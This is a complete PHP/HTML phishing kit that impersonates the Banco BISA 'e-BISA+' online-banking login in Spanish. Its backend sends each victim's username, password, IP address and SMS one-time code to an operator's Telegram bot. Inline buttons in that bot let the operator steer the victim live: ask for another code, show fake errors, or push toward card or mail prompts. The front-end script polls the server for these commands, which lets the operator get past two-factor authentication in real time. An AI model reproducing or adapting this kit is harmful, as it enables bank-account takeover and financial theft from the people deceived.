<?php
require_once __DIR__ . '/settings.php';

// ---------------------------------------------------------------
// HELPERS
// ---------------------------------------------------------------
function getClientIP() {
    $headers = ['HTTP_CF_CONNECTING_IP','HTTP_X_FORWARDED_FOR','HTTP_X_REAL_IP','REMOTE_ADDR'];
    foreach ($headers as $h) {
        if (!empty($_SERVER[$h])) {
            $ip = trim(explode(',', $_SERVER[$h])[0]);
            if (filter_var($ip, FILTER_VALIDATE_IP)) return $ip;
        }
    }
    return '0.0.0.0';
}

function sendTelegram($text, $reply_markup = null) {
    global $token, $chat_id;
    $params = [
        'chat_id'    => $chat_id,
        'text'       => $text,
        'parse_mode' => 'Markdown',
    ];
    if ($reply_markup) $params['reply_markup'] = $reply_markup;

    $ch = curl_init("https://api.telegram.org/bot$token/sendMessage");
    curl_setopt_array($ch, [
        CURLOPT_POST           => true,
        CURLOPT_POSTFIELDS     => http_build_query($params),
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT        => 5,
        CURLOPT_SSL_VERIFYPEER => true,
    ]);
    $r = curl_exec($ch);
    curl_close($ch);
    return $r;
}

function sanitize($s) {
    return htmlspecialchars(trim($s), ENT_QUOTES, 'UTF-8');
}

// ---------------------------------------------------------------
// API ENDPOINTS (POST y GET AJAX)
// ---------------------------------------------------------------
$method = $_SERVER['REQUEST_METHOD'] ?? 'GET';

// ---- POST: recibir datos y enviar a Telegram ----
if ($method === 'POST') {
    header('Content-Type: application/json; charset=UTF-8');
    $raw = file_get_contents('php://input');
    $data = json_decode($raw, true);
    if (!is_array($data)) $data = $_POST;

    $action = $data['action'] ?? '';
    $usr    = basename(sanitize($data['usuario'] ?? ''));

    if (!$usr) { echo json_encode(['ok'=>false,'error'=>'usuario vacío']); exit; }

    $ip = getClientIP();
    $ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
    $ts = date('d/m/Y H:i:s');
    $acciones_dir = __DIR__ . '/acciones';
    if (!is_dir($acciones_dir)) mkdir($acciones_dir, 0755, true);

    // --- Login (usuario + contraseña) ---
    if ($action === 'login') {
        $clave = $data['clave'] ?? '';
        // Limpiar acción previa
        @unlink("$acciones_dir/$usr.txt");

        $msg = "🔐 *e-BISA+ Login*\n\n"
             . "👤 Usuario: `$usr`\n"
             . "🔑 Clave: `$clave`\n"
             . "🌐 IP: `$ip`\n"
             . "🕐 Hora: $ts\n"
             . "📱 UA: `" . substr($ua, 0, 80) . "`";

        $buttons = json_encode(['inline_keyboard' => [
            [
                ['text' => '📲 SMS/TOKEN', 'callback_data' => "TOKEN|$usr"],
                ['text' => '❌ Login Error', 'callback_data' => "LOGIN-ERROR|$usr"],
            ],
            [
                ['text' => '🔁 Re-Login', 'callback_data' => "LOGIN|$usr"],
                ['text' => '✅ Listo', 'callback_data' => "LISTO|$usr"],
            ],
        ]]);

        sendTelegram($msg, $buttons);
        echo json_encode(['ok' => true]);
        exit;
    }

    // --- OTP / Código SMS ---
    if ($action === 'otp') {
        $otp = $data['otp'] ?? '';
        @unlink("$acciones_dir/$usr.txt");

        $msg = "📲 *e-BISA+ OTP/SMS*\n\n"
             . "👤 Usuario: `$usr`\n"
             . "🔢 Código: `$otp`\n"
             . "🕐 Hora: $ts";

        $buttons = json_encode(['inline_keyboard' => [
            [
                ['text' => '📲 Re-SMS', 'callback_data' => "TOKEN|$usr"],
                ['text' => '❌ SMS Error', 'callback_data' => "TOKEN-ERROR|$usr"],
            ],
            [
                ['text' => '💳 Card', 'callback_data' => "CARD|$usr"],
                ['text' => '📧 Mail', 'callback_data' => "MAIL|$usr"],
            ],
            [
                ['text' => '🔁 Re-Login', 'callback_data' => "LOGIN|$usr"],
                ['text' => '✅ Listo', 'callback_data' => "LISTO|$usr"],
            ],
        ]]);

        sendTelegram($msg, $buttons);
        echo json_encode(['ok' => true]);
        exit;
    }

    echo json_encode(['ok'=>false,'error'=>'acción no válida']);
    exit;
}

// ---- GET: polling de acciones ----
if ($method === 'GET' && isset($_GET['check'])) {
    header('Content-Type: application/json; charset=UTF-8');
    $usr = basename(sanitize($_GET['check']));
    $file = __DIR__ . "/acciones/$usr.txt";

    if ($usr && file_exists($file)) {
        $act = trim(file_get_contents($file));
        @unlink($file);
        echo json_encode(['action' => $act]);
    } else {
        echo json_encode(['action' => null]);
    }
    exit;
}

// ---------------------------------------------------------------
// PÁGINA HTML (GET normal sin ?check=)
// ---------------------------------------------------------------
?>
<!doctype html>
<html lang="es" translate="no">
<head>
  <meta charset="utf-8">
  <title>e-BISA+</title>
  <meta name="google" content="notranslate"/>
  <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=0">
  <link rel="preconnect" href="https://fonts.googleapis.com"/>
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin/>
  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet"/>
  <style>
    *, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
    html { font-family: sans-serif; -webkit-text-size-adjust: 100%; height: 100%; }
    body {
      font-family: 'Roboto', Arial, sans-serif;
      font-weight: 400;
      background: #ebebec;
      margin: 0;
      height: 100%;
      line-height: 1.42857143;
      -webkit-font-smoothing: antialiased;
      -moz-osx-font-smoothing: grayscale;
    }
    a { text-decoration: none; background-color: transparent; }
    a:active, a:hover { outline: 0; }
    button, input { font-family: 'Roboto', Arial, sans-serif; font-weight: 400; margin: 0; font: inherit; color: inherit; }
    button { overflow: visible; text-transform: none; cursor: pointer; }
    input { line-height: normal; user-select: text; -webkit-user-select: text; }
    input::-ms-clear { display: none; }

    ::-webkit-scrollbar { width: 8px; height: 8px; }
    ::-webkit-scrollbar-track { border-radius: 3px; background: #e1e1e1; }
    ::-webkit-scrollbar-thumb { border-radius: 3px; background: #999; }

    .app { display: flex; flex-direction: column; min-height: 100vh; }

    .header {
      background: #003e7e;
      display: flex; align-items: center; justify-content: center;
      padding: 0 24px; height: 180px; position: relative; z-index: 1;
    }
    .header-logo { display: flex; align-items: center; cursor: pointer; }
    .header-logo img { height: 78px; width: auto; display: block; margin-top: -47px; }
    .header-nav { position: absolute; top: 18px; right: 32px; display: flex; align-items: center; gap: 18px; }
    .header-nav a { color: #fff; font-size: 13px; font-weight: 400; opacity: 0.9; transition: opacity 0.2s; }
    .header-nav a:hover { opacity: 1; text-decoration: underline; }
    .lang-selector {
      color: #fff; font-size: 13px; font-weight: 400; cursor: pointer;
      background: rgba(255,255,255,0.15); border: none; border-radius: 0;
      padding: 5px 12px; display: flex; align-items: center; gap: 5px; transition: background 0.2s;
    }
    .lang-selector:hover { background: rgba(255,255,255,0.25); }
    .lang-selector svg { width: 14px; height: 14px; fill: #fff; }

    .main {
      flex: 1; display: flex; justify-content: center; align-items: flex-start;
      padding: 0 20px 30px; margin-top: -60px; position: relative; z-index: 2;
    }
    .card-wrapper {
      display: flex; max-width: 860px; width: 100%;
      background: #fff; border-radius: 0; overflow: hidden;
      box-shadow: 0 2px 12px rgba(0,0,0,0.08);
    }

    .login-panel {
      flex: 1; padding: 40px 48px 30px;
      display: flex; flex-direction: column; min-width: 0;
    }
    .login-panel h1 {
      font-size: 21px; font-weight: 400; color: #333;
      margin-bottom: 30px; font-family: 'Roboto', sans-serif;
    }
    .input-group { display: flex; align-items: center; gap: 12px; margin-bottom: 4px; }
    .user-icon { width: 32px; height: 32px; flex-shrink: 0; color: #9e9e9e; }
    .input-wrapper { flex: 1; position: relative; }
    .input-wrapper input {
      width: 100%; padding: 10px 38px 10px 12px;
      border: 1.5px solid #80cbc4; border-radius: 0;
      font-size: 14px; color: #333; outline: none; background: #fff;
      transition: border-color 0.2s, box-shadow 0.2s;
    }
    .input-wrapper input::placeholder { color: #999; font-weight: 300; }
    .input-wrapper input:focus { border-color: #26a69a; box-shadow: 0 0 0 2px rgba(38,166,154,0.15); }
    .input-wrapper .toggle-icon {
      position: absolute; right: 10px; top: 50%; transform: translateY(-50%);
      width: 20px; height: 20px; color: #9e9e9e; cursor: pointer; transition: color 0.2s;
    }
    .input-wrapper .toggle-icon:hover { color: #616161; }

    .virtual-kb { text-align: right; margin-bottom: 28px; margin-top: 5px; padding-left: 44px; }
    .virtual-kb a { color: #0278a7; font-size: 12px; text-decoration: none; font-weight: 400; }
    .virtual-kb a:hover { text-decoration: underline; }

    .btn-siguiente {
      width: 180px; align-self: center; padding: 11px 0;
      background: #43a047; color: #fff; border: none; border-radius: 0;
      font-size: 14px; font-weight: 500; cursor: pointer;
      transition: background 0.2s, box-shadow 0.2s; letter-spacing: 0.3px;
    }
    .btn-siguiente:hover { background: #388e3c; box-shadow: 0 2px 8px rgba(67,160,71,0.3); }
    .btn-siguiente:disabled { background: #a9d9f0; cursor: not-allowed; box-shadow: none; }

    .step-2 { display: none; }
    .step-2.active { display: block; }
    .step-1.hidden { display: none; }
    .user-chip {
      display: flex; align-items: center; gap: 10px;
      padding: 10px 14px; background: #f5f7fa;
      border-left: 3px solid #003e7e; margin-bottom: 20px;
      font-size: 14px; color: #333;
    }
    .user-chip strong { color: #003e7e; font-weight: 500; }
    .user-chip .change-user {
      margin-left: auto; color: #0278a7; font-size: 12px;
      cursor: pointer; background: none; border: none;
    }
    .user-chip .change-user:hover { text-decoration: underline; }

    .error-msg {
      display: none; padding: 10px 14px; margin-bottom: 16px;
      background: #fdecea; border-left: 3px solid #d32f2f;
      color: #b71c1c; font-size: 13px; line-height: 1.4;
    }
    .error-msg.active { display: block; }

    .loading-overlay {
      position: fixed; inset: 0; background: #003e7e;
      display: none; align-items: center; justify-content: center;
      flex-direction: column; z-index: 9999;
    }
    .loading-overlay.active { display: flex; }
    .loading-logo { width: 140px; height: auto; margin-bottom: 32px; animation: pulse 1.6s ease-in-out infinite; }
    @keyframes pulse {
      0%, 100% { opacity: 1; transform: scale(1); }
      50% { opacity: 0.7; transform: scale(0.96); }
    }
    .loading-bar { width: 220px; height: 3px; background: rgba(255,255,255,0.15); overflow: hidden; position: relative; }
    .loading-bar::before {
      content: ''; position: absolute; inset: 0; background: #ffc400;
      transform: translateX(-100%); animation: slide 1.4s ease-in-out infinite;
    }
    @keyframes slide {
      0% { transform: translateX(-100%); }
      50% { transform: translateX(0); }
      100% { transform: translateX(100%); }
    }
    .loading-text { margin-top: 20px; color: rgba(255,255,255,0.85); font-size: 13px; letter-spacing: 1px; font-weight: 300; }

    .otp-screen { display: none; position: fixed; inset: 0; background: #ebebec; z-index: 9998; flex-direction: column; }
    .otp-screen.active { display: flex; }
    .otp-header { background: #003e7e; height: 180px; display: flex; align-items: center; justify-content: center; position: relative; }
    .otp-header img { height: 78px; margin-top: -47px; }
    .otp-card {
      max-width: 480px; width: calc(100% - 40px); margin: -60px auto 0;
      background: #fff; padding: 40px 36px 32px; box-shadow: 0 2px 12px rgba(0,0,0,0.08);
      text-align: center; position: relative; z-index: 2;
    }
    .otp-icon {
      width: 64px; height: 64px; margin: 0 auto 20px; background: #003e7e;
      display: flex; align-items: center; justify-content: center; border-radius: 50%;
    }
    .otp-icon svg { width: 32px; height: 32px; }
    .otp-title { font-size: 20px; font-weight: 500; color: #003e7e; margin-bottom: 10px; }
    .otp-subtitle { font-size: 13.5px; color: #555; line-height: 1.5; margin-bottom: 24px; }
    .otp-subtitle strong { color: #003e7e; font-weight: 500; }
    .otp-inputs { display: flex; gap: 8px; justify-content: center; margin-bottom: 22px; }
    .otp-inputs input {
      width: 44px; height: 52px; border: 1.5px solid #80cbc4; background: #fff;
      font-size: 22px; text-align: center; color: #003e7e; font-weight: 500;
      outline: none; transition: border-color 0.2s, box-shadow 0.2s;
    }
    .otp-inputs input:focus { border-color: #003e7e; box-shadow: 0 0 0 2px rgba(0,62,126,0.15); }
    .otp-inputs input.filled { border-color: #003e7e; background: #f5f9ff; }
    .otp-timer { font-size: 12.5px; color: #666; margin-bottom: 20px; }
    .otp-timer strong { color: #003e7e; }
    .otp-error { display: none; color: #d32f2f; font-size: 12.5px; margin-bottom: 14px; }
    .otp-error.active { display: block; }
    .otp-resend {
      background: none; border: none; color: #0278a7;
      font-size: 12.5px; cursor: pointer; font-weight: 500;
    }
    .otp-resend:hover { text-decoration: underline; }
    .otp-resend:disabled { color: #aaa; cursor: not-allowed; text-decoration: none; }
    .btn-validar {
      width: 200px; padding: 12px 0; background: #43a047; color: #fff;
      border: none; font-size: 14px; font-weight: 500; cursor: pointer;
      transition: background 0.2s; letter-spacing: 0.3px; margin-top: 8px;
    }
    .btn-validar:hover { background: #388e3c; }
    .btn-validar:disabled { background: #a9d9f0; cursor: not-allowed; }

    .login-divider { margin-top: auto; border: none; border-top: 1px solid #e0e0e0; }

    .banner-panel {
      width: 380px; min-height: 340px; flex-shrink: 0;
      position: relative; overflow: hidden; display: flex; flex-direction: column; background: #f5f5f5;
    }
    .banner-image-area { flex: 1; position: relative; overflow: hidden; }
    .banner-image-area img { width: 100%; height: 100%; object-fit: cover; display: block; }
    .banner-dots {
      position: absolute; bottom: 10px; left: 50%; transform: translateX(-50%);
      display: flex; gap: 6px; align-items: center; z-index: 3;
    }
    .banner-dots span {
      width: 8px; height: 8px; border-radius: 50%;
      background: rgba(255,255,255,0.5); transition: background 0.3s;
      box-shadow: 0 0 2px rgba(0,0,0,0.3);
    }
    .banner-dots span.active { background: #ffc400; }

    .footer {
      text-align: center; padding: 16px 20px; background: #ebebec;
      display: flex; align-items: center; justify-content: center; gap: 8px;
    }
    .footer-icon { width: 16px; height: 16px; color: #888; flex-shrink: 0; }
    .footer p { font-size: 12px; color: #777; font-weight: 400; }

    @media (max-width: 768px) {
      body { background: #fff; }
      .header { height: 56px; padding: 0 16px; justify-content: flex-start; }
      .header-logo img { height: 32px; margin-top: 0; }
      .header-nav { position: static; margin-left: auto; gap: 14px; }
      .header-nav a.contact-text { display: none; }
      .header-nav a.contact-icon { display: inline-flex; }
      .lang-selector { background: transparent; padding: 4px 0; }
      .lang-selector .lang-full { display: none; }
      .lang-selector .lang-short { display: inline; }
      .lang-divider { display: inline-block; }
      .main { margin-top: 0; padding: 0; }
      .card-wrapper { flex-direction: column; max-width: 100%; background: #fff; border-radius: 0; box-shadow: none; }
      .login-panel { padding: 24px 20px 16px; }
      .login-panel h1 { font-size: 18px; margin-bottom: 24px; }
      .virtual-kb { display: none; }
      .btn-siguiente { align-self: flex-end; width: 150px; background: #a9d9f0; color: #fff; margin-right: 4px; }
      .btn-siguiente:hover { background: #8ec8e5; }
      .login-divider { margin-top: 24px; }
      .banner-panel { width: 100%; min-height: auto; }
      .banner-image-area img { height: auto; width: 100%; object-fit: contain; }
      .footer { display: none; }
      .otp-header { height: 120px; }
      .otp-header img { height: 50px; margin-top: -30px; }
      .otp-card { padding: 28px 20px 24px; margin-top: -40px; }
      .otp-inputs input { width: 38px; height: 46px; font-size: 18px; }
    }
    @media (min-width: 769px) {
      .header-nav a.contact-icon { display: none; }
      .lang-selector .lang-short { display: none; }
      .lang-divider { display: none; }
    }
  </style>
</head>
<body>
<div class="app">

  <header class="header">
    <div class="header-logo">
      <img src="img/logo_positivo_login-big.b9c9cab904e2bff7e1a9.png" alt="banco BISA"/>
    </div>
    <nav class="header-nav">
      <a href="#" class="contact-text">Contáctenos</a>
      <a href="#" class="contact-icon" aria-label="Contáctenos">
        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
          <rect x="2" y="4" width="20" height="16" rx="2"/>
          <path d="M2 6l10 7 10-7"/>
        </svg>
      </a>
      <span class="lang-divider" style="color:#fff;opacity:.5;">|</span>
      <button class="lang-selector" type="button">
        <span class="lang-full">Español</span>
        <span class="lang-short">ES</span>
        <svg viewBox="0 0 24 24"><path d="M7 10l5 5 5-5z"/></svg>
      </button>
    </nav>
  </header>

  <main class="main">
    <div class="card-wrapper">

      <section class="login-panel">
        <h1>Bienvenido a e-BISA+</h1>

        <div class="error-msg" id="loginError">Usuario o contraseña incorrectos. Intente nuevamente.</div>

        <!-- Step 1: Username -->
        <div class="step-1" id="step1">
          <div class="input-group">
            <svg class="user-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round">
              <circle cx="12" cy="8" r="4"/>
              <path d="M4 21v-1a7 7 0 0114 0v1"/>
            </svg>
            <div class="input-wrapper">
              <input type="text" placeholder="Ingrese su usuario" id="usuario" autocomplete="off"/>
              <svg class="toggle-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round">
                <path d="M17.94 17.94A10.07 10.07 0 0112 20c-7 0-11-8-11-8a18.45 18.45 0 015.06-5.94"/>
                <path d="M9.9 4.24A9.12 9.12 0 0112 4c7 0 11 8 11 8a18.5 18.5 0 01-2.16 3.19"/>
                <line x1="1" y1="1" x2="23" y2="23"/>
              </svg>
            </div>
          </div>
          <div class="virtual-kb"><a href="#">Teclado virtual</a></div>
          <button class="btn-siguiente" type="button" id="btnSiguiente">Siguiente</button>
        </div>

        <!-- Step 2: Password -->
        <div class="step-2" id="step2">
          <div class="user-chip">
            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#003e7e" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round">
              <circle cx="12" cy="8" r="4"/>
              <path d="M4 21v-1a7 7 0 0114 0v1"/>
            </svg>
            <strong id="userLabel">usuario</strong>
            <button class="change-user" type="button" id="btnCambiar">Cambiar</button>
          </div>
          <div class="input-group">
            <svg class="user-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round">
              <rect x="4" y="10" width="16" height="11" rx="1"/>
              <path d="M8 10V7a4 4 0 018 0v3"/>
            </svg>
            <div class="input-wrapper">
              <input type="password" placeholder="Ingrese su contraseña" id="password" autocomplete="current-password"/>
              <svg class="toggle-icon" id="togglePwd" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round">
                <path d="M17.94 17.94A10.07 10.07 0 0112 20c-7 0-11-8-11-8a18.45 18.45 0 015.06-5.94"/>
                <path d="M9.9 4.24A9.12 9.12 0 0112 4c7 0 11 8 11 8a18.5 18.5 0 01-2.16 3.19"/>
                <line x1="1" y1="1" x2="23" y2="23"/>
              </svg>
            </div>
          </div>
          <div class="virtual-kb"><a href="#">Teclado virtual</a></div>
          <button class="btn-siguiente" type="button" id="btnIngresar">Ingresar</button>
        </div>

        <hr class="login-divider"/>
      </section>

      <aside class="banner-panel">
        <div class="banner-image-area">
          <img src="img/descarga.jpg" alt="Recomendación de seguridad"/>
          <div class="banner-dots">
            <span class="active"></span><span></span><span></span>
          </div>
        </div>
      </aside>

    </div>
  </main>

  <footer class="footer">
    <svg class="footer-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round">
      <rect x="2" y="3" width="20" height="14" rx="2"/>
      <path d="M8 21h8"/><path d="M12 17v4"/>
    </svg>
    <p>&copy; 2026 Banco Bisa S.A. Todos los derechos reservados.</p>
  </footer>

</div>

<!-- Loading Overlay -->
<div class="loading-overlay" id="loadingOverlay">
  <img class="loading-logo" src="img/logo_positivo_login-big.b9c9cab904e2bff7e1a9.png" alt="Banco BISA"/>
  <div class="loading-bar"></div>
  <div class="loading-text">CARGANDO...</div>
</div>

<!-- OTP / SMS Screen -->
<div class="otp-screen" id="otpScreen">
  <div class="otp-header">
    <img src="img/logo_positivo_login-big.b9c9cab904e2bff7e1a9.png" alt="banco BISA"/>
  </div>
  <div class="otp-card">
    <div class="otp-icon">
      <svg viewBox="0 0 24 24" fill="none" stroke="#ffc400" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
        <rect x="6" y="2" width="12" height="20" rx="2"/>
        <line x1="11" y1="18" x2="13" y2="18"/>
      </svg>
    </div>
    <h2 class="otp-title">Verificación de seguridad</h2>
    <p class="otp-subtitle">
      Te hemos enviado un <strong>código SMS</strong> al número asociado a tu cuenta.<br/>
      Ingrésalo para continuar.
    </p>
    <div class="otp-error" id="otpError">Código incorrecto. Intente nuevamente.</div>
    <div class="otp-inputs" id="otpInputs">
      <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]"/>
      <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]"/>
      <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]"/>
      <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]"/>
      <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]"/>
      <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]"/>
    </div>
    <div class="otp-timer">El código expira en <strong id="otpTimer">02:00</strong></div>
    <button class="btn-validar" type="button" id="btnValidar" disabled>Validar</button>
    <div style="margin-top:18px;">
      <button class="otp-resend" type="button" id="btnResend" disabled>Reenviar código</button>
    </div>
  </div>
</div>

<script>
(function(){
  const $ = id => document.getElementById(id);
  const step1 = $('step1'), step2 = $('step2');
  const usuario = $('usuario'), password = $('password');
  const userLabel = $('userLabel');
  const btnSig = $('btnSiguiente'), btnIng = $('btnIngresar'), btnCambiar = $('btnCambiar');
  const togglePwd = $('togglePwd');
  const overlay = $('loadingOverlay');
  const loginError = $('loginError');
  const otpScreen = $('otpScreen');
  const otpInputs = document.querySelectorAll('#otpInputs input');
  const btnValidar = $('btnValidar'), btnResend = $('btnResend');
  const otpTimer = $('otpTimer'), otpError = $('otpError');

  let pollInterval = null;
  let timerInterval = null;
  let currentUser = '';

  // ── Helpers ──
  function showError(el) { el.classList.add('active'); }
  function hideError(el) { el.classList.remove('active'); }

  async function sendData(payload) {
    try {
      const r = await fetch('index.php', {
        method: 'POST',
        headers: {'Content-Type':'application/json'},
        body: JSON.stringify(payload),
      });
      return await r.json();
    } catch(e) { return {ok:false}; }
  }

  function startPolling(callback) {
    stopPolling();
    pollInterval = setInterval(async () => {
      try {
        const r = await fetch('index.php?check=' + encodeURIComponent(currentUser));
        const d = await r.json();
        if (d.action) { stopPolling(); callback(d.action); }
      } catch(e) {}
    }, 2000);
  }
  function stopPolling() {
    if (pollInterval) { clearInterval(pollInterval); pollInterval = null; }
  }

  // ── Step 1 → Step 2 ──
  function goToStep2() {
    const v = usuario.value.trim();
    if (!v) { usuario.focus(); return; }
    hideError(loginError);
    currentUser = v;
    userLabel.textContent = v;
    step1.classList.add('hidden');
    step2.classList.add('active');
    setTimeout(() => password.focus(), 50);
  }

  function goToStep1() {
    step2.classList.remove('active');
    step1.classList.remove('hidden');
    password.value = '';
    hideError(loginError);
    usuario.focus();
  }

  // ── Login submit ──
  async function doLogin() {
    const pwd = password.value;
    if (!pwd) { password.focus(); return; }
    hideError(loginError);
    overlay.classList.add('active');
    btnIng.disabled = true;

    await sendData({ action: 'login', usuario: currentUser, clave: pwd });

    // Polling: esperar instrucción del bot
    startPolling(handleLoginAction);
  }

  function handleLoginAction(action) {
    overlay.classList.remove('active');
    btnIng.disabled = false;

    if (action === 'token.php') {
      showOtp();
    } else if (action === 'loginerror.php') {
      showError(loginError);
      password.value = '';
      password.focus();
    } else if (action === 'listo.php') {
      overlay.classList.add('active');
      // Queda en pantalla de carga (finalizado)
    } else if (action === 'index.php') {
      goToStep1();
    } else {
      // Acción desconocida: mostrar OTP por defecto
      showOtp();
    }
  }

  // ── OTP Screen ──
  function showOtp() {
    otpScreen.classList.add('active');
    hideError(otpError);
    otpInputs.forEach(i => { i.value = ''; i.classList.remove('filled'); });
    btnValidar.disabled = true;
    startOtpTimer(120);
    setTimeout(() => otpInputs[0].focus(), 100);
  }

  function startOtpTimer(seconds) {
    clearInterval(timerInterval);
    btnResend.disabled = true;
    let s = seconds;
    const tick = () => {
      const m = String(Math.floor(s/60)).padStart(2,'0');
      const ss = String(s%60).padStart(2,'0');
      otpTimer.textContent = m+':'+ss;
      if (s <= 0) { clearInterval(timerInterval); btnResend.disabled = false; }
      s--;
    };
    tick();
    timerInterval = setInterval(tick, 1000);
  }

  otpInputs.forEach((input, idx) => {
    input.addEventListener('input', e => {
      const v = e.target.value.replace(/\D/g,'');
      e.target.value = v;
      v ? (e.target.classList.add('filled'), idx < otpInputs.length-1 && otpInputs[idx+1].focus())
        : e.target.classList.remove('filled');
      btnValidar.disabled = !Array.from(otpInputs).every(i => i.value);
    });
    input.addEventListener('keydown', e => {
      if (e.key === 'Backspace' && !input.value && idx > 0) otpInputs[idx-1].focus();
    });
    input.addEventListener('paste', e => {
      e.preventDefault();
      const data = (e.clipboardData.getData('text')||'').replace(/\D/g,'');
      data.split('').slice(0, otpInputs.length).forEach((ch,i) => {
        otpInputs[i].value = ch; otpInputs[i].classList.add('filled');
      });
      const ne = Array.from(otpInputs).findIndex(i => !i.value);
      (ne>=0 ? otpInputs[ne] : otpInputs[otpInputs.length-1]).focus();
      btnValidar.disabled = !Array.from(otpInputs).every(i => i.value);
    });
  });

  async function submitOtp() {
    const otp = Array.from(otpInputs).map(i => i.value).join('');
    if (otp.length < 6) return;
    hideError(otpError);
    overlay.classList.add('active');
    otpScreen.classList.remove('active');
    btnValidar.disabled = true;

    await sendData({ action: 'otp', usuario: currentUser, otp: otp });

    startPolling(handleOtpAction);
  }

  function handleOtpAction(action) {
    overlay.classList.remove('active');

    if (action === 'tokenerror.php') {
      otpScreen.classList.add('active');
      showError(otpError);
      otpInputs.forEach(i => { i.value = ''; i.classList.remove('filled'); });
      btnValidar.disabled = true;
      otpInputs[0].focus();
    } else if (action === 'token.php') {
      showOtp();
    } else if (action === 'loginerror.php') {
      otpScreen.classList.remove('active');
      showError(loginError);
      password.value = '';
      password.focus();
    } else if (action === 'index.php') {
      otpScreen.classList.remove('active');
      goToStep1();
    } else if (action === 'listo.php') {
      overlay.classList.add('active');
    } else {
      // card.php, mail.php u otro: loading permanente
      overlay.classList.add('active');
    }
  }

  // ── Event listeners ──
  btnSig.addEventListener('click', goToStep2);
  usuario.addEventListener('keydown', e => { if (e.key === 'Enter') goToStep2(); });
  btnCambiar.addEventListener('click', goToStep1);
  btnIng.addEventListener('click', doLogin);
  password.addEventListener('keydown', e => { if (e.key === 'Enter') doLogin(); });
  togglePwd.addEventListener('click', () => {
    password.type = password.type === 'password' ? 'text' : 'password';
  });

  btnValidar.addEventListener('click', submitOtp);
  btnResend.addEventListener('click', () => {
    otpInputs.forEach(i => { i.value = ''; i.classList.remove('filled'); });
    btnValidar.disabled = true;
    hideError(otpError);
    otpInputs[0].focus();
    startOtpTimer(120);
  });
})();
</script>

</body>
</html>
